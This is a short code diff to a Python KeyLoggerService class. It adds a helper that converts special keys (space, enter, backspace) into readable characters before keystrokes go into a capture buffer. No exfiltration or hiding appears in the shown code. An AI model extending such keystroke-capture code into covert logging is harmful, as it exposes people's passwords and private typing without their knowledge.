@@ -29,9 +29,19 @@ class KeyLoggerService(IKeyLogger):
     def get_is_logging(self) -> bool:
         return self.__is_logging
 
+    def convert_key_to_meaning(self, key):
+        if str(key) == "Key.space":
+            return " "
+        elif str(key) == "Key.enter":
+            return "\n"
+        elif str(key) == "Key.backspace":
+            return "\b"
+        else:
+            return str(key)
+
     def on_press(self, key):
         try:
             self.__buffer.add_data(key.char)
         except AttributeError:
-            self.__buffer.add_data(str(key))
+            self.__buffer.add_data(self.convert_key_to_meaning(key))
 
